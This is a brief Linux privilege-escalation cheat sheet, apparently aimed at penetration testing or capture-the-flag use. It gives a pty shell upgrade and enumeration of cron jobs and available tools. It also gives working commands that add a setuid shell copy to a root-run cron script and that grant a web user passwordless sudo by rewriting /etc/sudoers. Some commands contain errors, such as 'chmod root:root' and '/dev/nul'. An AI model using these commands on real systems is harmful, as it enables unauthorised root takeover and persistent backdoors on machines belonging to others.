Linux Privilege escalation
==========================

***1. Command to get bash shell from $***

$ python -c 'import pty; pty.spawn("/bin/bash");'  
user@machine:


**2. Identifcation methods**
1. Check su privileged files

2. Check cronjobs
cd /etc/cron* - Check all the folders

3. Check the programs avilable in the machine

which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/nul

**3. Using vulnerable cronjob running in root**

echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh

**4. Modifying sudoers file and provide nopasswd access for a low privileged user**

echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update
